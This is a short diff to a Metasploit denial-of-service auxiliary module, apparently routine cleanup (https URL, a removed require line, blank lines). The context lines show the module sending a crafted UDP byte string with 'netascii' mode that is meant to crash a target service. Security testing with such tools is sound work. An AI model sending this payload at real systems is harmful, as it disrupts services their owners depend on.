@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Udp
   include Msf::Auxiliary::Dos
 
@@ -38,5 +35,4 @@ class MetasploitModule < Msf::Auxiliary
     udp_sock.put("\x00\x01\x01\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00")
     disconnect_udp
   end
-
 end
